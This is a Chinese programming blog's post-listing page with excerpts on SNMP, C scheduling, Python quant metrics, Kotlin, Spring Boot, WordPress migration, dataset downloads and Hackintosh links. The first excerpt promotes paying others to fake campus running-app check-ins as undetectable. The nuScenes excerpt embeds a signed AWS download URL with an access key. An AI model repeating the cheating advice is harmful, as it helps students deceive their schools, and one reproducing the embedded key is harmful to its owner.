<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c8f95a60a4bde34c2baee4ec263a1828/" rel="bookmark">
			步道乐跑怎么刷次数_不想跑步道乐跑之类的校园app怎么办？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		众所周知，进入大学！每天都有各种事情要忙，学校还要强制下载一堆软件！除了一些学习软件，还要打卡步道乐跑之类的运动软件。
这对于本来忙碌的我们，无疑就是徒增负担。对于学习很忙碌而且职务较多的同学，推荐找代跑的同学，代跑一公里也就1元左右，一般安卓和苹果手机都是检测不出来什么异常的，可以绝对放心了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d43ade72fa26f8ff8594bd63a246a31/" rel="bookmark">
			snmp安装采集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言安装net-snmpSnmp V1/V2Snmp V3总结 前言 最近在做snmp 采集相关的项目，记录一下
snmp 采集首先需要一个好的工具，推荐两款
MIB brower ：非常好用 ，但是商业版，一个月试用期Net-snmp: 适用于window/Linux(mac不支持V3) 安装net-snmp 下载： net-snmp下载地址安装 #解压 tar -xzvf net-snmp-5.7.tar.gz cd net-snmp-5.7 # 安装 ./configure 可执行文件：--prefix 指定安装目录(可选), 默认安装在 /usr/local 下 ./configure 安装过程中提示输入信息， 直接 enter 选择默认，默认信息如下
1、default version of-snmp-version(3):
2、System Contact Information (@@no.where)（配置该设备的联系信息）:
3、System Location (Unknown)(该系统设备的地理位置):
4、Location to write logfile (日志文件位置):
5、Location to Write persistent(数据存储目录):
编译 make &amp;&amp; make install
编译过程比较漫长
配置 # 创建 etc 目录，如果已存在可忽略 mkdir -p /usr/local/snmp/etc # 添加配置文件 cp net-snmp-5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4d43ade72fa26f8ff8594bd63a246a31/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2b72e2356245ab41652108e1bf691936/" rel="bookmark">
			ECS框架示例代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于C++：
https://github.com/alecthomas/entityx
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/856fccd8a8b62b7227687e3b77380b5f/" rel="bookmark">
			c语言实现时间片轮转调度算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include &lt;stdio.h&gt;//引入输入输出流文件
#include &lt;stdlib.h&gt;
struct PCB
{
int pid;//进程标识符
int rr;//已运行时间
int time;//进程要求运行时间
char sta;//进程的状态
struct PCB *next;//链接指针
};
struct PCB pcb1,pcb2,pcb3,pcb4,pcb5,*tail,*head,*rp;
void init()//初始化各个进程的运行时间
{
int time;
pcb1.pid = 1;//用结构体进行赋初值
pcb2.pid = 2;
pcb3.pid = 3;
pcb4.pid = 4;
pcb5.pid = 5;
pcb1.rr =pcb2.rr =pcb3.rr =pcb4.rr =pcb5.rr = 0;//各个间片赋值是0
pcb1.sta = pcb2.sta = pcb3.sta = pcb4.sta = pcb5.sta = ‘w’;//用w字符表示wait等待
printf(“请输入进程p1需要运行的时间:”);
scanf("%d",&amp;time);
pcb1.time =time;//把时间元素赋值给结构体元素
printf(“请输入进程p2需要运行的时间:”);
scanf("%d",&amp;time);
pcb2.time=time; //把时间元素赋值给结构体元素
printf(“请输入进程p3需要运行的时间:”);
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/856fccd8a8b62b7227687e3b77380b5f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1b3e1638c71606b839de153f68d6480/" rel="bookmark">
			python alpha策略_【手把手教你】Python量化策略风险指标
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如何衡量一个量化策略的好坏？一是比较稳定的收益，二是有严谨的回测，三是有清晰的逻辑。——刘富兵
引言
引言尽管过去不能代表未来，通过历史回测来评估量化策略仍然是量化投资非常重要的一环。量化回测过程中常用到的指标有年化收益率、最大回撤、beta、alpha、夏普比率、信息比率等(见下图)。目前很多量化网站都能提供Python的量化回测框架，如聚宽 、优矿、万矿、Zipline 、vnpy 和pyalgotrade等，为我们评估量化策略提供了很好的交互平台。毕竟平台的使用有其局限性，如果不借助平台， 如何使用python写一个简单的量化回测框架呢？本文将一步一步为你展示如何使用python计算量化策略风险指标。文中提及股票仅供学习示例，不构成投资建议。
(数据来源：优矿·通联实验室)
01指标含义及公式
01累计收益率与年化收益率
年化收益率是把当前收益率(日收益率、周收益率、月收益率)换算成年收益率来计算的，是一种理论收益率，并不是真正的已取得的收益率。因为年化收益率是变动的，所以年收益率不一定和年化收益率相同。
累计收益率：
其中，PT是期末卖出时的价格，Pt是期初买入时的价格。
年化收益率：
其中，R是期间总收益率，m是与n(可以是天数、周数、月数)相对应的计算周期，根据计算惯例，m=250、52、12分别指代日、周、月向年化的转换。
02最大回撤
在选定周期内任一历史时点往后推，于最低点时的收益率回撤幅度的最大值。最大回撤用来描述可能出现的最糟糕的情况。最大回撤是一个重要的风险指标，对于量化策略交易，该指标比波动率还重要。
P为某一天的净值，i为某一天，j为i后的某一天，Pi为第i天的产品净值，Pj则是Pi后面某一天的净值
则该基金的最大回撤计算如下：
即通过对每一个净值进行回撤率求值，然后找出最大的。
03Beta和Alpha
Beta：相当于业绩评价基准收益的总体波动性，计算如下：
Pi和Pm分别指代个股(组合)、市场(如上证综指)的收益率序列，beta值也常被用来衡量某一策略的系统性风险。
其含义可以简单理解为：如果Beta为1，策略和市场(如沪深300指数)波动相同；如果Beta大于1，策略波动大于市场，如2，则市场上涨10%时，策略上涨20%；反之亦然。如果Beta小于1，则策略波动小于市场，如为0.8，市场上涨10%时，策略上涨8%；反之亦然。
Beta值如何看呢？这得具体问题具体分析，如果是牛市，个股、大盘狂涨，Beta值大的策略占优；如果是熊市，Beta值小的策略占优。
Alpha：实际收益和按照Beta系数计算的期望收益之间的差额。代表策略多大程度上跑赢了预期的收益率。
可以使用资本资产定价模型(CAPM)来估计策略的beta和alpha的值：
E(ri)是股票i的预期收益率，rf是无风险利率，rm是市场指数收益率；beta系数在评估股市波动风险与投资机会的方法中，常用来衡量结构性与系统性风险，可以简单理解为个股波动相对大盘波动的偏离程度。CAPM的计量模型可以表示为：
alpha可以理解为超额收益率，最后一项是随机扰动，可以理解为个体风险。
04夏普比率和信息比率
夏普比率代表每多承担一份风险，可以获得几份回报，即单位风险所获得的超额回报，该比率越高，策略承担单位风险得到的超额回报越高，所以夏普比率越高越好。
其中，Rp为策略年化收益率，Rf是无风险收益率，
为年化标准差。
信息比率：含义与夏普比率类似，只不过其参照基准不是无风险收益率，而是策略的市场基准收益率。
其中，Rp为策略年化收益率，Rm为基准年化收益率(如沪深300指数)，
为策略与基准每日收益率差值的年化标准差。
02Python计算量化指标
使用tushare获取交易数据，考虑最简单的策略：买入持有！分别计算期间总收益率，年化收益率，最大回撤，beta、alpha系数，夏普比率和信息比率。
#先引入后面可能用到的包(package)
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
%matplotlib inline
#正常显示画图时出现的中文和负号
from pylab import mpl
mpl.rcParams['font.sans-serif']=['SimHei']
mpl.rcParams['axes.unicode_minus']=False
### 获取数据：tushare开源库(确认已安装好：pip install tushare)
import tushare as ts
#起始和结束日期可以自行输入，否则使用默认
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b1b3e1638c71606b839de153f68d6480/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/52e9d51bcd37efb9e873219ca34ab1fc/" rel="bookmark">
			移动开发实验5
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简单的地图功能：
代码：
https://github.com/1283364352/baidu
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cdb71694da57015e7039eceed89f311f/" rel="bookmark">
			实现元素拖拽放大缩小_使用Fresco实现大图浏览（支持手势放大、拖拽）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Fresco简介 Fresco是facebook出品的一款图片加载框架，使用了Fresco之后，不需要再考虑图片的加载和内存占用的问题，堪称图片加载的神器。Fresco将图片存储到一个特殊的区域，避免了OOM。
Fresco：https://github.com/facebook/fresco
二、使用Fresco实现大图浏览 先上效果图：
1、需求 点击图片出现大图浏览的界面背景要全黑没有状态栏支持手势放大及拖拽点击关闭大图浏览 2、功能实现 (1)、引入Fresco和PhotoDraweeView 要实现手势放大和拖拽，还需要引入PhotoDraweeView
PhotoDraweeView：https://github.com/ongakuer/PhotoDraweeView
在项目中添加依赖
compile 'com.facebook.fresco:fresco:1.2.0'compile 'me.relex:photodraweeview:1.1.2' (2)、初始化Fresco 创建MyApp，继承自Application，在onCreate()方法中初始化Fresco
public class MyApp extends Application { @Override public void onCreate() { super.onCreate(); Fresco.initialize(this); }} 在清单文件中指定Application类，
(3)、添加SimpleDraweeView控件 在主页面添加SimpleDraweeView控件，设置下载链接，然后设置点击事件，跳转到图片浏览页面
添加SimpleDraweeView控件
设置下载链接并设置点击事件
public class MainActivity extends AppCompatActivity { private SimpleDraweeView mImageView; private String IMG_URL = "https://juemuren4449.com/uploads/mouse.jpg"; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); initView(); initData(); initEvent(); } private void initView() { mImageView = (SimpleDraweeView) findViewById(R.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cdb71694da57015e7039eceed89f311f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23e02e8be0d373e71558318c8b04aa48/" rel="bookmark">
			c&#43;&#43;枚举变量遍历_advancedday17XML,DTD约束,schema约束及枚举,注解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		XML的语法 1.xml是由自定义的标签组成 &lt;开始标签&gt;标签体结束标签&gt; &lt;自闭合标签/&gt;2.xml文件的语法 1)必须要有一个文档声明 xml version="1.0" encoding="UTF-8" ?&gt; 2)只有一个根标签 3)特殊字符 如&lt; &gt; &amp; 必须使用特殊的比较进行代替 &amp;lt; &lt; 小于 &amp;gt; &gt; 大于 &amp;amp; &amp; 和号 &amp;apos; '单引号 &amp;quot; "引号 4)CDATA区，数据可以被原样显示，不被当做标签解析 [CADATA[内容]]&gt; &lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;students&gt; &lt;student id="001"&gt; &lt;name&gt;张三name&gt; &lt;age&gt;20age&gt; student&gt;students&gt; DOM解析 使用Java代码来识别xml中的数据，这个过程叫做xml解析。
Document对象: 表示整个xml文件ELEMENT对象： 表示某一个标签Arribute对象：表示属性对象Text对象： 表中体 导入dom4j.jar包
1.在模块下新建一个lib文件夹2.复制dom4j-1.6.1.jar到lib目录下3.选中jar文件右键，点击Add As Library 查看dom4j提供的文档，解析xml文件
SAXReader reader = new SAXReader();//获取整个dom数Document document = reader.read("day17/a.xml");//获取根标签Element rootElement = document.getRootElement();//获取根标签下面的子标签，子标签有多个List&lt;Element&gt; list = rootElement.elements("student");//创建用于存储Student对象的集合，解析后的数据封装为Student对象List&lt;Student&gt; stuList=new ArrayList&lt;&gt;();//遍历集合for (Element element : list) { //获取id属性的值 String id = element.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/23e02e8be0d373e71558318c8b04aa48/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/900b4f3f0c638080f540b2e319264a8e/" rel="bookmark">
			Kotlin协程介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言
1. Kotlin协程是啥？
2. Kotlin协程具体介绍
2.0 Kotlin协程的优点
2.1 添加依赖
2.2 启动协程
2.3 协程作用域（CoroutineScope）
2.4 Job（作业）
2.5 CoroutineDispatcher（调度器）
2.6 suspend关键字
3. Jetpack库对协程的支持
4. Retrofit对协程的支持 参考文章
前言 介绍Kotlin协程之前，我们先来看看广义上的协程是啥。
用于在程序中处理并发任务的一种方案比线程更加轻量级的存在，线程的上下文切换都需要内核（操作系统的核心）参与，而协程的上下文切换，完全由用户去控制，避免了大量的中断参与，减少了线程上下文切换与调度消耗的资源。线程上下文切换具体如下所示： 挂起一个线程，将这个线程在 CPU 中的状态（上下文）存储于内存中的某处；
恢复一个线程，在内存中检索下一个线程的上下文并将其在 CPU 的寄存器中恢复；
跳转到程序计数器所指向的位置（即跳转到线程被中断时的代码行），以恢复该线程。
线程上下文：线程Id + 线程状态 + 堆栈 + 寄存器状态等
1. Kotlin协程是啥？ Kotlin 的协程和⼴义的协程不是⼀种东⻄，Kotlin 的协程是⼀个线程框架，本质上只是一套基于原生Java Thread API 的封装，类似于Android 的 Handler 系列 API。Android官方文档中提到，协程是一种并发设计模式，可以在 Android 平台上使用Kotlin协程来简化异步执行的代码。 2. Kotlin协程具体介绍 2.0 Kotlin协程的优点 协程最大的优点是可以帮我们自动切线程，用看起来同步的方式写出异步的代码，不用再写回调了。利用线程发起两个并行请求很困难，一般可能就会选择先后请求，而如果是协程的话利用两个async（）函数开启两个协程同步请求就很容易了。使用协程作用域统一管理协程可以减少内存泄漏。许多 Jetpack 库都包含提供全面协程支持的扩展。 2.1 添加依赖 implementation 'org.jetbrains.kotlinx:kotlinx-coroutines-android:1.3.9' 2.2 启动协程 launch（） 需要在CoroutineScope中启动，launch返回一个「Job」，用于协程监督与取消，用于无返回值的场景。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/900b4f3f0c638080f540b2e319264a8e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9dc3459060a7b1d32946d061bffb5410/" rel="bookmark">
			spring boot的配置文件的加载顺序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Spring Boot中采用了大量的自动化配置，但是对开发者而言，在实际项目中不可避免会有一些需要自己手动配置，承载这些自定义配置的文件就是resources目录下的application.properties文件。
Spring Boot项目中的application.properties配置文件一共可以出现在如下4个位置：
·
项目根目录下的config文件夹中。项目根目录下。classpath下的config文件夹中。classpath下。 例如：
例如，在resources目录下创建一个配置文件app.properties，然后将项目打成jar包，打包成功后，使用如下命令运行：
Java -jar springboot003.jar --springboot.config.name=app 在运行时再指定配置文件的名字。使用spring.config.location可以指定配置文件所在目录（注意需要以/结束），代码如下：
Java -jar springboot003.jar --springboot.config.name=app --springboot.config.location=classpath:/ 表示启用放在classpath吗、根目录下的名字叫做app的配置文件
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8db9d72a615419b9fadcf2fd1982a55f/" rel="bookmark">
			通俗易懂解释一类和二类错误(Type I Error Type II Error)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		通俗易懂解释一类和二类错误(Type I Error Type II Error) 作者 KULDEEP PATEL
翻译自False Positive (Type I Error) and False Negative (Type II Error)
本文涵盖以下与“误报False Positive和漏报False Negative”及其在机器学习领域中的意义有关的主题：
解释3个案例Python代码（Scikit-Learn）我们如何衡量分类问题中的错误？还想获得更多相关内容？：有关医学检验假阳性和假阴性的新闻 解释 ▲I型错误（误报 False Positive）和II型错误（漏报 False Negative）
通过查看该图，您对I型和II型错误有了解了吗？让我们探索一下它。
这张图表示年龄（在X轴上，自变量）与已婚（在Y轴上，因变量）之间的关系。Y取决于X的值，即某人已婚（Y = 1或Yes）或未婚（Y = NO 获0）的决定取决于人的年龄。
误报 （False Postive），也称Type I Error 蓝色十字标记→红色十字标记（实际→预测）
就是那个25到30之间的一蓝一红的2个点
注意图中的十字标记符号，其中蓝色十字标记表示实际值，红色十字标记表示预测值。在25至30岁左右的年龄，一个名叫A先生的人实际上并未结婚。但是，预测说A先生已结婚，这是一个错误的预测（即False），并且预测值是Yes或1（即Positive）。因此，它被称为“误报False Postive”或“ I类错误”。
漏报（False Negative），也称Type II Error 蓝色圆圈标记→红色圆圈标记（实际→预测） 即20-25之间的两个点
在此方案中，蓝色圆圈标记和红色圆圈标记分别表示实际值和预测值。实际上，一个名为B先生的人已婚，年龄约为20-25岁。但是，预测值表明B先生尚未结婚。因此，在这种情况下，预测也是错误的（即False），并且预测值为No或0（即Negative）。这被称为“漏报False Negative”或II型错误。
解释说明 Interpretation 误报-当预测错误且预测值是真时
漏报-当预测错误且预测值为假时
False Positive- when a prediction is wrong &amp; predicted value is positive
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8db9d72a615419b9fadcf2fd1982a55f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7f9c04f2e3b9333724837ee6f6f9adb6/" rel="bookmark">
			京瓷2010打印机苹果电脑能用吗_理光Ricoh Pro TF6250平板打印机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		专业介绍各种喷墨打印新技术、新产品、新工艺，
穿越四季，不分寒暑，每晚与您相约，不见不散。
喷印技术微信公众号客服微信2108326081
欢迎关注【喷印技术】抖音号：PYJS和PYJSW
喷印技术网http://www.ipackjet.cn/
【喷印技术】微信公众号
Ricoh Pro TF6250平板打印机这是一款针对工业，标志和图形打印市场平板打印机。它有一个2.5 x 1.3米的床，可以打印高达110毫米的介质，带有一个传感器，可以自动将打印头调整到介质的高度。床被分成四个真空区域，床上有定位销以帮助对齐介质。 虽然生产质量可能较慢，但它可以生产高达129.23平方米/小时。这是一款LED UV打印机，采用Ricoh打印头，分辨率高达635 x 1800 dpi。 它可以打印CMYK墨水加上白墨和光油，理光表示有不同的墨水可用于应对困难和无涂层的介质，包括一个专注于标志和图形应用的高色域。
它具有日常维护方案，通过一键式启动，可清洁和清洗打印头。 专业维修压电喷墨打印头：理光，柯尼卡，精工，东芝，星光，赛尔，京瓷、爱普生喷头拉丝斜喷，喷孔堵塞，串孔侧漏，修好收费，修不好不收费。
喷墨打印机喷头堵漏神器 喷头堵侧漏万能胶水使用教程
HP FI-1000技术单程彩色喷墨打印机
包装纸箱喷墨打印机器人 完美打印四个侧面
EFI Reggiani POWER数码印花机
吾特数码科技公司推出理光G5i工业级喷头系列打印机
MUTOH智能打印技术
爱普生工业级直接服装打印机SureColor F3070展会视频
袜子数码印花机
圆柱体白墨打印效果
塑料条单程喷墨打印机
京瓷喷头单色轮转喷墨印刷机
喷墨打印空客A320飞机外壳
Memjet喷头椭圆形数码印花机
2019年花王创新日：数码印刷模块
康丽数码推出新一代成衣直喷数码印花机Kornit Vulcan Plus
喷墨打印发泡乳胶海绵 高低差10毫米
瓦楞纸板Single-Pass喷墨打印机
Nazdar墨水公司介绍视频
理光新款喷头GEN5i明年会火吗？
爱克发Jeti Tauro H2500 LED宽幅设备用户分享，生产速度是之前机器的四倍
爱普生行货4720喷头 永不加密 无需配卡
宽幅打印机中溶剂墨水、弱溶剂墨水和UV墨水的最新进展
购买uv打印机前需要了解的10个关于打印头问题
Mutoh开发新的树脂墨水MP31
不小心给压电写真机加错墨水该如何补救呢？
使用水性墨水之前，需要先了解水性墨水的化学性能
用于柔性薄膜包装的水性喷墨墨水LUNAJET
一款引爆抖音的UV墨水 最大延展性可达350%
三招呈现完美板材双面喷墨打印
3分钟了解柯尼卡美能达工业喷墨打印头
爱克发UV墨水柔韧性试验视频
喷墨打印吸塑效果
UV墨水打印过程中产生异味的原因和处理方法
理光G5喷头如何保养的视频
完美解决理光G5喷头侧漏问题
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7f9c04f2e3b9333724837ee6f6f9adb6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/168c60a1d367b3e9a74052dbdfecfa7a/" rel="bookmark">
			无法修改服务器名称_网站设计：WordPress网站搬家简要教程(修改)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、背景 1、我的axuretop.com(域名已经注销），是用的阿里云香港虚拟主机，访问速度太慢。
使用阿里云主机管理控制台进行网站管理
2、注册的jidong.tech(域名已经注销）是郑州景安网络备案，服务器是国内郑州的，访问速度相对快一些
服务器是使用老薛主机，使用cPanel面板进行服务器管理（注，截图是cPanel的界面，其他的管理界面会有不同，请注意）
3、所以这篇文章是 从C服务器搬家到D服务器，分为域名不变和域名由A更改为B两种情况的教程。
为了方便下面文章的理解，注释下：
C服务器=旧服务器/阿里云香港服务器 D服务器=新服务器/景安郑州服务器 A域名=旧域名/ http:// axuretop.com B域名=新域名/jidong.tech 二、准备工作 1、域名解析
将新旧域名和新旧服务器做好域名解析，别解析错了。我的是把jidong.tech解析到郑州景安服务器上。如下图，我的域名是在阿里云的万网上购买，所以在阿里云上做好域名的解析
2、新主机设置
因为我的郑州服务器原来放上了Axure原型html文件，为保证服务器如莲花的纯洁，需要重置服务器，将服务器恢复到最初状态，见图2
然后，配置两个地方：
2.1 配置php版本：多PHP管理器（调整到最新版本），见图16
2.2 配置PHP环境：多 PHP INI 编辑器（将几个限制放开，不然后期上传文件的大小都收到限制），见图17
具体步骤 （一）网页文件转移
在旧服务器（阿里云服务器）上导出网页文件
阿里云的主机管理控制台，有数据库备份和网页备份功能，图片1
将网页文件下载下来，上传到新服务器（景安郑州服务器）目录中，并解压到根目录
(可能会遇到的情况就是解压到一个文件里了，需要移动到根目录里；Linux主机须上传至public_ htmI；Windows主机须上传至根目录,文件夹名称为htdocs），图片3、4、5、6
（二）数据库转移
1、在原来服务器（旧服务器，阿里云服务器）上导出数据库
阿里云的主机管理控制台，有数据库备份功能，图片1
2、在新服务器（景安郑州服务器）上，导入数据库
注：老薛主机，使用phpMyAdmin进行数据库管理
2.1先在新服务器上，新建数据库 见图9
添加新用户,见图10
向数据库添加用户，授予全部权限，见图11
再注意：记录下你的数据库的名，用户名，密码
2.2 使用phpMyAdmin，在新服务器数据库中导入数据
见图12（注：最大支持50M的数据库导入，多于50M的无法导入，目前没有研究出可行的方案）
（三）修改数据库
如果不修改域名就不用修改数据库；
如果要修改域名，就相当麻烦了，具体如下：
1、搜索。
在数据库中搜索含有原来域名的字段，查看含有 原网站域名的表和字段，如下图
可以看到多个表中含有原站域名，先点击第一个含有原网站域名的表右侧的『浏览』按钮，如下
进入表后，确定 原网站域名所在的字段
2、替换
执行替换命令，把所有表中的原网站域名替换为新网站域名
UPDATE AAAAAA SET BBBBBB = REPLACE(BBBBBB,’旧地址’,’新地址’);
注释如下
AAAAAA：表名
BBBBBB：该表中含有 原网站域名的字段名字
旧地址：旧网站域名
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/168c60a1d367b3e9a74052dbdfecfa7a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f73ec0779d111dfcdd17bc761de88c34/" rel="bookmark">
			linux系统下nuScenes数据集快速下载方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		下载数据的链接为 https://www.nuscenes.org/download
但是用浏览器下载链接时，下载速度比较慢，而且下载链接容易断掉，需要人为再次点击继续下载。
快的时候校园网下能达到20-30M/s,慢的时候大概也有500K/s.
解决方法：
适用于linux系统：
打开终端，输入如下命令
wget -c -O v1.0-mini.tar "https://s3.ap-southeast-1.amazonaws.com/asia.data.nuscenes.org/public/v1.0/v1.0-mini.tgz?AWSAccessKeyId=AKIA6RIK4RRMFUKM7AM2&amp;Signature=3EmV7R8g8YPDtge%2Bg8SsUb80bC8%3D&amp;Expires=1581948359" 这段是下载 V1.0-mini.tar,双引号括住的是V1.0-mini.tar的网页链接，所以如果要下载更大的数据的格式为：
wget -c -O [数据集名字] [对应的网页下载链接] 检查下载的文件是否完好无损
md5sum v1.0-mini.tar 对生成的md5码与完整数据对应的的md5码进行校验，以确认下载的数据无误
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/412c305d04139cf0f6ac6b6ca75e259a/" rel="bookmark">
			分辨率_图像分辨率是什么？分辨率对图片质量的影响
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		图像分辨率是什么？ 一个块表示一个像素
图像分辨率就是指单位面积上包含像素点的个数，常用像素/英寸(pixels per inch，ppi)来表示。
也可以用长宽像素相乘的方式表示(长像素个数×宽像素个数)
例如100ppi：表示图像中每英寸包含100个像素点；400×300就表示这图片长边一行像素400个，宽边一行像素300个。
同理，我们常见的手机厂家宣传的屏幕ppi也是一样，单位面积的像素，ppi越高，屏幕显示的效果越细腻。
对图片质量的影响是什么 像素越小，单位面积所包含的像素就越多，分辨率就越高，但同样的物理大小范围内对应图像的尺寸就会越大，存储图像的磁盘空间就要更大。对于手机拍照来说，摄像头传感器的单个像素越小，分辨率会提高，但是单个像素的进光量就会下降，所以为什么小米的一亿像素的相机传感器那么大，就是保证提高分辨率的同时保证进光量。而进光亮对拍照至关重要的，尤其是夜拍。
图像的分辨率越高，图像就越清晰，图像文件所需要的存储空间就越大，后期处理和编辑所需要的时间就越长。
例如：在我们使用微信或者qq发送消息时，没有选择原图发送的情况下就是对该图片进行采样，但是是一种欠采样的状态(每个单位面积只取一部分像素，降低了ppi，照片就会丢失细节，放大就会不清晰)但是传输这张照片只会消耗少许流量。但单击发送原图和下载原图就可以得到清晰的照片。
分辨率对比
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/931fcf6dd88f666c8f9cf1ef318cc510/" rel="bookmark">
			OpenCore制作EFI常用下载地址集合
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言必备OpenCoreHfsPlus.efi下载必备KextsVirtualSMCLiluWhateverGreen 常用KextsUSBInjectAllAppleALCVoodooHDAWireless-USB-OC-Big-Sur-Adapter网卡IntelMausiSmallTreeIntel82576 kextAtherosE2200EthernetRealtekRTL8111LucyRTL8125Ethernet XHCI-unsupportedWiFi and BluetoothAirportItlwmIntelBluetoothFirmwareAirportBrcmFixupBrcmPatchRAM 笔记本电脑VoodooPS2RehabMan's VoodooPS2VoodooRMIVoodooSMBusVoodooI2C 工具软件ProperTreepythonopencore-configuratorOpencore Gen-XDPCIManagerHackintool 预建的SSDT（Pre-Built SSDTs）OpenCore beauty treatment（启动菜单图形界面主题）参考文档 前言 为了方便大家下载最新版本的相关文件，特别整理最新的下载地址。如有不足欢迎补充。
必备 OpenCore https://github.com/acidanthera/OpenCorePkg/releases
HfsPlus.efi https://github.com/acidanthera/OcBinaryData/blob/master/Drivers/HfsPlus.efi
下载必备Kexts VirtualSMC https://github.com/acidanthera/VirtualSMC/releases
Lilu https://github.com/acidanthera/Lilu/releases
WhateverGreen https://github.com/acidanthera/WhateverGreen/releases
常用Kexts USBInjectAll usb
https://bitbucket.org/RehabMan/os-x-usb-inject-all/downloads/
AppleALC 声卡
https://github.com/acidanthera/AppleALC/releases
VoodooHDA “万能声卡”
https://sourceforge.net/projects/voodoohda/
Wireless-USB-OC-Big-Sur-Adapter 万能usb无线网卡
https://github.com/chris1111/Wireless-USB-OC-Big-Sur-Adapter
网卡 IntelMausi 对于大多数Intel NIC都是必需的，基于I211的芯片组将需要SmallTreeIntel82576 kext正式支持英特尔的82578、82579，i217，i218和i219 NIC需要OS X 10.9或更高版本，10.8-10.8用户可以使用IntelSnowMausi代替旧的OS
https://github.com/acidanthera/IntelMausi/releases SmallTreeIntel82576 kext i211 NIC必需，基于SmallTree kext，但已打补丁以支持I211大多数运行Intel NIC的AMD板必需需要OS X 10.9-12（v1.0.6），macOS 10.13-14（v1.2.5），macOS 10.15+（v1.3.0）
https://github.com/khronokernel/SmallTree-I211-AT-patch/releases AtherosE2200Ethernet Atheros和Killer NIC需要需要OS X 10.8或更高版本注：Atheros的杀手E2500模型实际上是基于瑞昱，对于这些系统，请使用RealtekRTL8111代替
